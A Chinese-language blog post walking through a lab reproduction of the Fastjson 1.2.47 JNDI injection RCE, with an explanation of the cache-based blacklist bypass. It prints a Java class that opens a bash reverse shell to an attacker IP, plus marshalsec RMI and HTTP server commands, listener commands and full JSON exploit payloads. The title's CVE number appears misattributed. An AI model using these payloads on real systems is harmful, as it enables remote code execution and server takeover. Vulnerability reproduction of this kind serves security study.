---
title: "Fastjson 1.2.47 JNDI 注入复现：CVE-2019-0223"
date: 2026-08-23 20:00:00 +0800
categories: [漏洞复现, Web安全]
tags: [Fastjson, JNDI, 反序列化, RCE, CVE-2019-0223]
---

## 一、产品介绍
Fastjson 是**阿里巴巴开源的 Java 语言 JSON 处理库**，主要负责 Java 对象和 JSON 字符串之间做序列化、反序列化转换，在 Java 后端项目广泛使用。

**核心功能：**
1. **序列化**：把 Java 对象转为 JSON 字符串，`JSON.toJSONString()`
2. **反序列化**：把 JSON 字符串转回 Java 对象，`JSON.parseObject()`
3. 支持 JSONObject、JSONArray，直接操作 JSON 结构数据。

## 二、漏洞背景

## 爆发背景与实际影响 
漏洞爆发时Fastjson是国内Java生态使用最广泛的JSON解析组件，大量用于企业后台、电商系统、政务平台、RPC接口、Redis序列化等业务场景。漏洞POC公开之后，互联网出现大规模扫描脚本，挖矿木马、批量攻击工具快速扩散，大量未升级的业务系统遭受入侵，服务器被植入挖矿程序、后门。 该漏洞属于国内非常经典的Java反序列化漏洞，后续Fastjson官方虽然通过升级版本增加黑名单进行防护，但后续多次出现黑名单绕过漏洞，大量历史遗留系统长期存在该类风险，至今仍是渗透测试中高频遇到的组件漏洞。


## 三、复现过程
## 手写恶意类
利用marshalsec-0.0.3-SNAPSHOT-all.jar去本地启动rmi服务自己写一个恶意类让目标服务器去加载
**步骤1：编写恶意Java类（WriteJsp.java）**

```java
import java.io.*;
public class WriteJsp {
    static {
        try {
            String cmd[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.241.241.171/9999 0>&1"};
            Runtime.getRuntime().exec(cmd);
        }catch(Exception e){
        }
    }
}
```

```java
//编译成class：
javac WriteJsp.java
//得到 WriteJsp.class
```

**步骤2：攻击机起HTTP服务，提供class下载**
把class放在当前目录，python开启http服务，靶机会过来下载这个class文件：

```
#python3
python3 -m http.server 8888
```

**步骤3：启动RMI服务（marshalsec）**
marshalsec的RMIRefServer，RMI端口1099，指向我们http服务上的恶意类。

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://10.241.241.171:8888/#WriteJsp" 1099
```

**步骤 4：开启监听（接收靶机反弹 Shell）**

```shell
ncat -lvnp 9999  ### Windows（攻击机）监听（用 ncat，nmap 套件带的 ncat.exe）
nc -lvnp 9999    #Linux（攻击机，kali/alpine/ubuntu）监听
```

**步骤5：发送fastjson payload给靶机（POST JSON）**

Content-Type: `application/json`

```
POST / HTTP/1.1
Host: 10.241.241.171:8090
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0
Sec-Purpose: prefetch;prerender
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Type: application/json
Content-Length: 168

{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://10.241.241.171:1099/WriteJsp",
        "autoCommit": true
    }
}
```

BurpSuite发送，靶机触发JNDI，拉取`WriteJsp.class`，执行static{}里面的命令反弹shell给攻击机
![pasted image 20260825231529](/assets/img/posts/2026-08-23-fastjson-1-2-47-jndi-injection/pasted-image-20260825231529.png)

---
## 使用现成工具
直接利用JNDI的工具JNDIInject-1.4.jar生成恶意类进行远程加载
GitHub地址：https://github.com/Bl0omZ/JNDIEXP

```
# 启动 LDAP + HTTP 服务
java -jar JNDIInject-1.4.jar -i <your-ip>
```

![pasted image 20260825180619](/assets/img/posts/2026-08-23-fastjson-1-2-47-jndi-injection/pasted-image-20260825180619.png)
构造payload

```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.241.241.171:1389/basic/touch /tmp/success",
        "autoCommit":true
    }
}
```

![pasted image 20260825180648](/assets/img/posts/2026-08-23-fastjson-1-2-47-jndi-injection/pasted-image-20260825180648.png)
![pasted image 20260825180710](/assets/img/posts/2026-08-23-fastjson-1-2-47-jndi-injection/pasted-image-20260825180710.png)

## 四、漏洞原理
**原理**：
+ `java.lang.Class` 不在黑名单
+ 第一次解析把 `JdbcRowSetImpl` 加入全局缓存 `mapping`
+ 第二次直接使用缓存中的类，绕过黑名单检查
